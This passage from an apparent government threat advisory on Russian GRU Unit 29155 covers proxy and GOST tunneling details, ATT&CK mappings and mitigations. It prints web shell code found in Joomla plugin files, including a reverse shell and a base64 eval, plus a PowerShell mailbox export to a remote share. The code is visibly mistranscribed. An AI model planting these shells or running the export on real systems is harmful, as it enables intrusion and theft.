<li>Configuring a proxy within the victim infrastructure and executing commands within the network via ProxyChains. ProxyChains—a tool used to route internal traffic through a series of proxies [<a href="https://attack.mitre.org/versions/v15/techniques/T1090/003/" title="Proxy: Multi-hop Proxy">T1090.003</a>]—has been used to provide further anonymity and modify system configuration to force network traffic through chains of SOCKS5 proxies and respective ports. The following ports used by actor infrastructure include:
<ol>
<li>1080</li>
<li>1333</li>
<li>13381</li>
<li>13391</li>
<li>13666</li>
<li>13871</li>
<li>1448</li>
<li>1888</li>
<li>3130</li>
<li>3140</li>
<li>4337</li>
<li>50001</li>
<li>8079</li>
</ol>
</li>
<li>Using the GOST open source tunneling tool (via SOCKS5 proxy) named <code>java</code>, as detailed in the following running processes in victim incident response results:</li>
</ol>
<p><code>8212 - SJ 0:02.54 HISTFILE=/dev/null</code><br /><code>PATH=/sbin:/bin:/usr/sbin:/usr/bin</code><br /><code>LD_LIBRARY_PATH=/usr/local/lib:/usr/local/lib OLDPWD=/tmp</code><br /><code>PWD=/tmp/.ICE-unix HOME=/ RC PID=33980 ./java –L</code><br /><code>socks5://127.0.0.1:13338</code></p>
<p><code>8282 - IJ 0:03.98 HISTFILE=/dev/null</code><br /><code>PATH=/sbin:/bin:/usr/sbin:/usr/bin</code><br /><code>LD_LIBRARY_PATH=/usr/local/lib:/usr/local/lib OLDPWD=/tmp</code><br /><code>PWD=/tmp/.ICE-unix HOME=/ RC_PID=33980 ./java –L</code><br /><code>rtcp://0.0.0.0:13381/127.0.0.1:13338 -F socks5://{IP Address}:7896</code></p>
<ol>
<li>Modifying .php scripts to manipulate server-side operations, such as the observations listed in <strong>Table 2</strong> below.</li>
</ol>
<div>
<table class="tablesaw tablesaw-stack">
<thead>
<tr>
<th>Script (Base64 Decoded)</th>
<th>Command</th>
<th>Purpose&nbsp;</th>
</tr>
</thead>
<tbody>
<tr>
<td>usr/local/www/apache24/data/-redacted-/plugins/extension/oomla/oomla.php</td>
<td>
<p><code>if (isset($ POST ["sessionsid_wp"] ))</code></p>
<p><code>{</code></p>
<p><code>$poll id = $ POST ["sessionsid_wp") ;</code></p>
<p><code>$sessii = explode(":",</code></p>
<p><code>base64_decode($poll_id)) ;$sock=fsockopen($sessii[O) ,$sessii[l));</code></p>
<p><code>$proc=proc_open(/bin/sh -i), array(O=&gt;$sock, l=&gt;$sock,</code></p>
<p><code>2=&gt;$sock) ,$pipes);</code></p>
<p><code>}</code></p>
</td>
<td>Creates session.</td>
</tr>
<tr>
<td>Usr/local/www/apache24/data/-redacted-/plugins/authentication/joomla/oomla.php</td>
<td>
<p><code>function nb_res($a)</code></p>
<p><code>{</code></p>
<p><code>eval(system('base64 decode ($a) ');</code></p>
<p><code>}</code></p>
</td>
<td>Allows program to run.</td>
</tr>
<tr>
<td>Usr/local/www/apache24/data/-redacted-/plugins/privacy/contact/contact.php</td>
<td>
<p><code>if (isset($_POST['fl']))</code></p>
<p><code>{</code></p>
<p><code>$fl=$_POST['fl'] ;</code></p>
<p><code>$f2=$_POST['f2'] ;</code></p>
<p><code>$content = base64 decode($fl);</code></p>
<p><code>$h = fopen($f2."w");</code></p>
<p><code>$text = "$content";</code></p>
<p><code>fwrite($h.$text) ;</code></p>
<p><code>fclose ($h) ;</code></p>
<p><code>}</code></p>
</td>
<td>Allows writing to files.</td>
</tr>
</tbody>
</table>
<p>Exfiltration</p>
<p>In several instances, analysis identified Unit 29155 cyber actors compressing victim data [<a href="https://attack.mitre.org/versions/v15/techniques/T1560/" title="Archive Collected Data">T1560</a>] (e.g., the entire filesystem, select file system artifacts or user data, and/or database dumps) to send back to their infrastructure. These cyber actors commonly use the command-line program Rclone to exfiltrate data to a remote location from victim infrastructure.</p>
<p>Unit 29155 cyber actors have exfiltrated Windows processes and artifacts, such as Local Security Authority Subsystem Service (LSASS) memory dumps [<a href="https://attack.mitre.org/versions/v15/techniques/T1003/001/">T1003.001</a>], Security Accounts Manager (SAM) files [<a href="https://attack.mitre.org/versions/v15/techniques/T1003/002/" title="OS Credential Dumping: Security Account Manager">T1003.002</a>], and SECURITY and SYSTEM event log files [<a href="https://attack.mitre.org/versions/v15/techniques/T1654/" title="Log Enumeration">T1654</a>]. As seen in victim incident response results, actor infrastructure has also been used to compromise multiple mail servers [<a href="https://attack.mitre.org/versions/v15/techniques/T1114/" title="Email Collection">T1114</a>] and exfiltrate mail artifacts, such as email messages, using PowerShell [<a href="https://attack.mitre.org/versions/v15/techniques/T1059/001/" title="Command and Scripting Interpreter: PowerShell">T1059.001</a>] via the following command:</p>
<p><code>powershell New-MailboxExportRequest – Mailbox &lt;resource&gt; – FilePath `\\{IP Address}\sharefolder\1.pst`</code></p>
<h2><strong>MITRE ATT&amp;CK Tactics and Techniques</strong></h2>
<p>See <strong>Table 3 to&nbsp;Table 14</strong> for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href="https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping" title="Best Practices for MITRE ATT&amp;CK Mapping">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href="https://github.com/cisagov/Decider/" title="cisagov / decider">Decider Tool</a>.</p>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 3: Reconnaissance</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Gather Victim Network Information: DNS</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1590/002/" title="Gather Victim Network Information: DNS">T1590.002</a></td>
<td>Unit 29155 cyber actors have used Amass and VirusTotal to obtain information about victims’ DNS for possible use during targeting, such as subdomains for target websites.</td>
</tr>
<tr>
<td>Active Scanning</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1595/" title="Active Scanning">T1595</a></td>
<td>Unit 29155 cyber actors use publicly available tools to gather information for possible use during targeting.</td>
</tr>
<tr>
<td>Active Scanning: Scanning IP Blocks</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1595/001/" title="Active Scanning: Scanning IP Blocks">T1595.001</a></td>
<td>Unit 29155 cyber actors use various open source scanning tools to scan for victim IP ranges.</td>
</tr>
<tr>
<td>Active Scanning: Vulnerability Scanning</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1595/002/" title="Active Scanning: Vulnerability Scanning">T1595.002</a></td>
<td>Unit 29155 cyber actors use publicly available scanning tools to enable their discovery of IoT devices and exploitable vulnerabilities. Tools leveraged for scanning include Acunetix, Amass, Droopescan, eScan, and JoomScan.</td>
</tr>
<tr>
<td>Search Open Technical Databases: Scan Databases</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1596/005/" title="Search Open Technical Databases: Scan Databases">T1596.005</a></td>
<td>Unit 29155 cyber actors use publicly available platforms like Shodan to identify internet connected hosts.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 4: Resource Development</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Acquire Infrastructure: Virtual Private Server</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1583/003/" title="Acquire Infrastructure: Virtual Private Server">T1583.003</a></td>
<td>Unit 29155 cyber actors have used VPSs to host their operational tools, perform reconnaissance, exploit victim infrastructure, and exfiltrate victim data.</td>
</tr>
<tr>
<td>Obtain Capabilities: Malware</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1588/001/" title="Obtain Capabilities: Malware">T1588.001</a></td>
<td>Unit 29155 cyber actors obtain publicly available malware and malware loaders to support their operations. For example, analysis suggests Raspberry Robin malware may have been used in the role of an access broker.</td>
</tr>
<tr>
<td>Obtain Capabilities: Exploits</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1588/005/" title="Obtain Capabilities: Exploits">T1588.005</a></td>
<td>Unit 29155 cyber actors are known to obtain CVE exploit scripts from GitHub repositories and use them against victim infrastructure.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 5: Initial Access</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th colspan="2">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts: Default Accounts</td>
<td colspan="2"><a href="https://attack.mitre.org/versions/v15/techniques/T1078/001/" title="Valid Accounts: Default Accounts">T1078.001</a></td>
<td>Unit 29155 cyber actors use exploitation scripts to authenticate to IP cameras with default usernames and passwords.</td>
</tr>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1190/" title="Exploit Public-Facing Application">T1190</a></td>
<td colspan="2">
<p>Unit 29155 cyber actors have used a variety of public exploits, including CVE-2021-33044, CVE-2021-33045, CVE-2022-26134, and CVE-2022-26138.</p>
<p>The proof of concept exploit for CVE-2022-26134, Through the Wire, has also been used against a victim’s internet-facing Confluence server.</p>
</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 6: Execution</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter: PowerShell</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1059/001/" title="Command and Scripting Interpreter: PowerShell">T1059.001</a></td>
<td>Unit 29155 cyber actors have used PowerShell to execute commands and other operational tasks.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 7: Persistence</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Server Software Component: Web Shell</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1505/003/" title="Server Software Component: Web Shell">T1505.003</a></td>
<td>Unit 29155 cyber actors use web shells to establish persistent access to systems.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 8: Credential Access</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping: LSASS Memory</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1003/001/" title="OS Credential Dumping: LSASS Memory">T1003.001</a></td>
<td>Unit 29155 cyber actors have exfiltrated LSASS memory dumps to retrieve credentials from victim machines.</td>
</tr>
<tr>
<td>OS Credential Dumping: Security Account Manager</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1003/002/" title="OS Credential Dumping: Security Account Manager">T1003.002</a></td>
<td>Unit 29155 cyber actors have exfiltrated usernames and hashed passwords from the SAM.</td>
</tr>
<tr>
<td>Brute Force: Password Spraying</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1110/003/" title="Brute Force: Password Spraying">T1110.003</a></td>
<td>Unit 29155 cyber actors targeted victims’ Microsoft OWA infrastructure with password spraying to obtain valid usernames and passwords.</td>
</tr>
<tr>
<td>Unsecured Credentials: Credentials in Files</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1552/001/" title="Unsecured Credentials: Credentials in Files">T1552.001</a></td>
<td>Following exploitation of vulnerable IP cameras, Unit 29155 cyber actors dump configuration settings and credentials in plaintext.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 9: Discovery</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Network Service Discovery</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1046/" title="Network Service Discovery">T1046</a></td>
<td>Once Unit 29155 cyber actors gained access to victim internal networks, they further used Nmap (via the NSE) to write custom scripts for discovering and scanning other machines.</td>
</tr>
<tr>
<td>Log Enumeration</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1654/" title="Log Enumeration">T1654</a></td>
<td>Unit 29155 cyber actors have enumerated and exfiltrated SECURITY and SYSTEM logs.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 10: Lateral Movement</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Use Alternate Authentication Material: Pass the Hash</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1550/002/" title="Use Alternate Authentication Material: Pass the Hash">T1550.002</a></td>
<td>Unit 29155 cyber actors used Pass-the-Hash to authenticate via SMB.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 11: Collection</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Email Collection</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1114/" title="Email Collection">T1114</a></td>
<td>Unit 29155 cyber actors have used their infrastructure to compromise multiple victims’ mail servers and exfiltrate mail artifacts, such as email messages.</td>
</tr>
<tr>
<td>Video Capture</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1125/" title="Video Capture">T1125</a></td>
<td>Unit 29155 cyber actors have exploited IoT devices, specifically IP cameras with default usernames and passwords, and exfiltrated images.</td>
</tr>
<tr>
<td>Data from Information Repositories: Confluence</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1213/001/" title="Data from Information Repositories: Confluence">T1213.001</a></td>
<td>Unit 29155 cyber actors leveraged Through the Wire against the victim’s internet-facing Confluence server.</td>
</tr>
<tr>
<td>Archive Collected Data</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1560/" title="Archive Collected Data">T1560</a></td>
<td>Unit 29155 cyber actors compress victim data (e.g., the entire filesystem, select file system artifacts or user data, and/or database dumps) to send back to their infrastructure.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 12: Command and Control</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Proxy: Multi-hop Proxy</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1090/003/" title="Proxy: Multi-hop Proxy">T1090.003</a></td>
<td>
<p>Unit 29155 cyber actors executed commands via ProxyChains—a tool used to route internal traffic through a series of proxies.</p>
<p>ProxyChains was also used to provide further anonymity and modify system configuration to force network traffic through chains of SOCKS5 proxies and respective ports.</p>
</td>
</tr>
<tr>
<td>Application Layer Protocol: Web Protocols</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1071/001/" title="Application Layer Protocol: Web Protocols">T1071.001</a></td>
<td>Unit 29155 cyber actors use POST requests over HTTP to send payloads to victims.</td>
</tr>
<tr>
<td>Application Layer Protocol: DNS</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1071/004/" title="Application Layer Protocol: DNS">T1071.004</a></td>
<td>Unit 29155 cyber actors used DNS tunneling tools, such as dnscat/2 and Iodine, to tunnel IPv4 network traffic.</td>
</tr>
<tr>
<td>Non-Application Layer Protocol</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1095/" title="Non-Application Layer Protocol">T1095</a></td>
<td>Unit 29155 cyber actors commonly use a reverse TCP connection to initiate communication with their infrastructure.</td>
</tr>
<tr>
<td>Ingress Tool Transfer</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1105/" title="Ingress Tool Transfer">T1105</a></td>
<td>When an exploit is successfully executed on a victim system, Unit 29155 cyber actors are known to launch the Meterpreter payload to initiate communication with their actor-controlled systems.</td>
</tr>
<tr>
<td>Protocol Tunneling</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1572/" title="Protocol Tunneling">T1572</a></td>
<td>Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration to tunnel traffic over a single port (1194), VPNs, and GOST to anonymize their operational activity.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 13: Exfiltration</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exfiltration Over Web Service: Exfiltration to Cloud Storage</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1567/002/" title="Exfiltration Over Web Service: Exfiltration to Cloud Storage">T1567.002</a></td>
<td>Unit 29155 cyber actors exfiltrated data to the cloud storage and file hosting service, MEGA (mega[.]nz), using Rclone.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 14: Impact</em></caption>
<thead>
<tr>
<th>Technique Title&nbsp;</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data Destruction</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1485/" title="Data Destruction">T1485</a></td>
<td>Unit 29155 cyber actors’ objectives include the destruction of data.</td>
</tr>
</tbody>
</table>
<h2><strong>Mitigations</strong></h2>
<p>The authoring agencies recommend organizations implement the mitigations supplied below to improve organizational cybersecurity posture based on threat actor activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s&nbsp;<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals" title="Cross-Sector Cybersecurity Performance Goals">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<h3>Limit Adversarial Use of Common Vulnerabilities</h3>
<ul>
<li><strong>Prioritize patching to CISA’s&nbsp;</strong><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog"><strong>Known Exploited Vulnerabilities Catalog</strong></a><strong>,&nbsp;</strong>especially for CVEs identified in this advisory, and then critical and high vulnerabilities that allow for remote code execution on internet-facing devices.</li>
<li><strong>Conduct regular automated vulnerability scans</strong> to perform vulnerability assessments on all network resources based on threat actor behaviors and known exploitable vulnerabilities (<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E" title="Mitigating Known Vulnerabilities (1.E)">CISA CPG 1.E</a>).</li>
<li><strong>Limit exploitable services on internet-facing assets,</strong> such as email and remote management&nbsp;protocols (<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#EmailSecurity2M">CISA CPGs 2.M</a>, <a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NoExploitableServicesontheInternet2W" title="No Exploitable Services on the Internet (2.W)">2.W</a>). Where necessary services must be exposed, such as services hosted in a demilitarized zone (DMZ), implement the appropriate compensatory controls to prevent common forms of abuse and exploitation. Disable all unnecessary operating system applications and network protocols to combat adversary enumeration. For additional guidance, see <a href="https://www.cisa.gov/sites/default/files/publications/CISAInsights-Cyber-RemediateVulnerabilitiesforInternetAccessibleSystems_S508C.pdf" title="Remediate Vulnerabilities for Internet-Accessible Systems">CISA Insights: Remediate Vulnerabilities for Internet-Accessible Systems</a>.</li>
<li><strong>U.S. organizations can utilize a range of CISA services at no cost, including vulnerability scanning and testing, to help organizations reduce exposure to threats.</strong> CISA Cyber Hygiene services can provide additional review of internet-accessible assets and provide regular reports on steps to take to mitigate vulnerabilities. Email <a href="mailto:vulnerability@cisa.dhs.gov" title="Vulnerability">vulnerability@cisa.dhs.gov</a> with the subject line, “Requesting Cyber Hygiene Services,” to get started.</li>
<li><strong>Software manufacturers, vendors, and consumers</strong> are encouraged to review CISA and NIST’s <a href="https://www.cisa.gov/resources-tools/resources/defending-against-software-supply-chain-attacks-0" title="Defending Against Software Supply Chain Attacks">Defending Against Supply Chain Attacks</a>. This publication provides an overview of software supply chain risks and recommendations for how software customers and vendors can use the NIST Cyber Supply Chain Risk Management (C-SCRM) Framework and the Secure Software Development Framework (SSDF) to identify, assess, and mitigate software supply chain risks. CISA recommends comprehensive mitigations for supply chain incident reporting, vulnerability disclosing (e.g., security.txt), and choosing a trusted supplier or vendor that observes proper cyber security hygiene (<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SupplyChainIncidentReporting1G" title="Supply Chain Incident Reporting (1.G)">CISA CPG 1.G</a>, <a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SupplyChainVulnerabilityDisclosure1H" title="Supply Chain Vulnerability Disclosure (1.H)">1.H</a>, <a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#VendorSupplierCybersecurityRequirements1I" title="Vendor/Supplier Cybersecurity Requirements (1.I)">1.I</a>) to defend against upstream attacks.</li>
</ul>
<h3>Deploy Protective Controls and Architecture</h3>
<ul>
<li><strong>Implement network segmentation.</strong> Network segmentation can help prevent lateral movement by controlling traffic flows between—and access to—various subnetworks (<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F" title="Network Segmentation (2.F)">CISA CPG 2.F</a>). Best practice mitigations include updating Identity and Access Management (IAM) and employing phishing-resistant MFA for all devices and accounts identified as organizational assets. For additional guidance, see CISA and NSA’s&nbsp;<a href="https://www.cisa.gov/news-events/alerts/2023/03/21/cisa-and-nsa-release-enduring-security-framework-guidance-identity-and-access-management" title="CISA and NSA Release Enduring Security Framework Guidance on Identity and Access Management">IAM Recommended Best Practices Guide for Administrators</a> (<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H" title="Phishing-Resistant Multifactor Authentication (MFA) (2.H)">CISA CPG 2.H</a>).</li>
<li><strong>Verify and ensure that sensitive data, including credentials, are not stored in plaintext&nbsp;and can only be accessed by authenticated and authorized users.</strong> Credentials must be stored in a secure manner, such as with a credential/password manager to protect from malicious enumeration (<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SecureSensitiveData2L" title="Secure Sensitive Data (2.L)">CISA CPG 2.L</a>).</li>
<li><strong>Disable and/or restrict use of command line and PowerShell activity.</strong> Update to the latest version and uninstall all earlier PowerShell versions (<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DisableMacrosbyDefault2N" title="Disable Macros by Default (2.N)">CISA CPG 2.N</a>).</li>
<li><strong>Implement a continuous system monitoring program, such as security information and event management (SIEM) or endpoint detection and response (EDR) solutions,</strong> to comprehensively log and review all authorized external access connections. This logging will better ensure the prompt detection of misuse or abnormal activity (<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#LogCollection2T" title="Log Collection (2.T)">CISA CPG 2.T</a>).</li>
<li><strong>Monitor for unauthorized access attempts and programming anomalies</strong> through comprehensive logging that is secured from modification, such as limiting permissions and adding redundant remote logging (<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SecureLogStorage2U" title="Secure Log Storage (2.U)">CISA CPG 2.U</a>). Security appliances should be set to detect and/or block Impacket framework indicators, PSExec or WMI commands, and suspicious PowerShell commands for timely identification and remediation.</li>
<li><strong>Identify any use of outdated or weak encryption,</strong> update these to sufficiently strong algorithms, and consider the implications of post-quantum cryptography (<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#StrongandAgileEncryption2K" title="Strong and Agile Encryption (2.K)">CISA CPG 2.K</a>). Use properly configured and up-to-date Secure Socket Layer (SSL)/Transport Layer Security&nbsp;(TLS) to protect data in transit.</li>
</ul>
<h2><strong>Security Controls</strong></h2>
<p>In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see <strong>Table 3 to&nbsp;Table 14</strong>).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h2><strong>Resources</strong></h2>
<ul>
<li><a href="https://attack.mitre.org/software/S0689/" title="WhisperGate">MITRE: WhisperGate</a></li>
<li><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-057a" title="Destructive Malware Targeting Organizations in Ukraine">CISA AA22-057A: Destructive Malware Targeting Organizations in Ukraine</a></li>
<li><a href="https://www.justice.gov/opa/pr/russian-national-charged-conspiring-russia-military-intelligence-destroy-ukrainian" title="Russian National Charged for Conspiring with Russian Military Intelligence to Destroy Ukrainian Government Computer Systems and Data">DOJ Press Release: Russian National Charged for Conspiring with Russian Military Intelligence to Destroy Ukrainian Government Computer Systems and Data</a></li>
<li><a href="https://www.fbi.gov/investigate/cyber" title="Cyber Crime">FBI: Cyber Crime</a></li>
<li><a href="https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/russia" title="Russia Cyber Threat Overview and Advisories">CISA: Russia Cyber Threat Overview and Advisories</a></li>
<li><a href="https://attack.mitre.org/groups/G1003/" title="Ember Bear">MITRE: Group G1003 - Ember Bear</a></li>
<li><a href="https://attack.mitre.org/versions/v15/software/S0357/" title="Impacket">MITRE: Impacket</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1472" title="CVE-2020-1472">NIST NVD: CVE-2020-1472</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-26084" title="CVE-2021-26084">NIST NVD: CVE-2021-26084</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3156" title="CVE-2021-3156">NIST NVD: CVE-2021-3156</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-4034" title="CVE-2021-4034">NIST NVD: CVE-2021-4034</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-27666" title="CVE-2022-27666">NIST NVD: CVE-2022-27666</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33044" title="CVE-2021-33044">NIST NVD: CVE-2021-33044</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33045" title="CVE-2021-33045">NIST NVD: CVE-2021-33045</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-26134" title="CVE-2022-26134">NIST NVD: CVE-2022-26134</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-26138" title="CVE-2022-26138">NIST NVD: CVE-2022-26138</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-3236" title="CVE-2022-3236">NIST NVD: CVE-2022-3236</a></li>
<li><a href="https://attack.mitre.org/software/S0521/" title="BloodHound">MITRE: BloodHound</a></li>
<li><a href="https://attack.mitre.org/versions/v15/software/S1040/" title="Rclone">MITRE: Rclone</a></li>
<li><a href="https://attack.mitre.org/versions/v15/software/S0598/" title="P.A.S. Webshell">MITRE: P.A.S. Webshell</a></li>
<li><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog">CISA: Known Exploited Vulnerabilities Catalog</a></li>
<li><a href="https://www.cisa.gov/sites/default/files/publications/CISAInsights-Cyber-RemediateVulnerabilitiesforInternetAccessibleSystems_S508C.pdf" title="Remediate Vulnerabilities for Internet-Accessible Systems">CISA Insights: Remediate Vulnerabilities for Internet-Accessible Systems</a></li>
<li><a href="https://www.cisa.gov/resources-tools/resources/defending-against-software-supply-chain-attacks-0" title="Defending Against Supply Chain Attacks">CISA, NIST: Defending Against Supply Chain Attacks</a></li>
<li><a href="https://www.cisa.gov/news-events/alerts/2023/03/21/cisa-and-nsa-release-enduring-security-framework-guidance-identity-and-access-management" title="IAM Recommended Best Practices Guide for Administrators">CISA, NSA: IAM Recommended Best Practices Guide for Administrators</a></li>
</ul>
<h2><strong>References</strong></h2>
<ol>
<li><a href="https://www.microsoft.com/en-us/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/" title="Destructive Malware Targeting Ukrainian Organizations">Microsoft Threat Intelligence Center: Destructive Malware Targeting Ukrainian Organizations</a></li>
<li><a href="https://www.microsoft.com/en-us/security/blog/2023/06/14/cadet-blizzard-emerges-as-a-novel-and-distinct-russian-threat-actor/?msockid=2383e2d882c06a751a17f64383d26b64" title="Cadet Blizzard Emerges as a Novel and Distinct Russian Threat Actor">Microsoft Threat Intelligence Center: Cadet Blizzard Emerges as a Novel and Distinct Russian Threat Actor</a></li>
<li><a href="https://www.crowdstrike.com/blog/who-is-ember-bear/" title="Featured Recent Videos Categories Start Free Trial Featured Recent Videos Categories Start Free Trial">CrowdStrike: EMBER BEAR Threat Actor Profile</a></li>
<li><a href="https://cloud.google.com/blog/topics/threat-intelligence/russia-invasion-ukraine-retaliation/" title="Responses to Russia's Invasion of Ukraine Likely to Spur Retaliationred Recent Videos Categories Start Free Trial">Mandiant Threat Intelligence: Responses to Russia's Invasion of Ukraine Likely to Spur Retaliation</a>&nbsp;</li>
<li><a href="https://www.sentinelone.com/blog/threat-actor-uac-0056-targeting-ukraine-with-fake-translation-software/" title="Threat Actor UAC-0056 Targeting Ukraine with Fake Translation Software">SentinelOne: Threat Actor UAC-0056 Targeting Ukraine with Fake Translation Software</a></li>
<li><a href="https://www.acunetix.com/support/docs/introduction/" title="Introduction to Acunetix">Introduction to Acunetix</a></li>
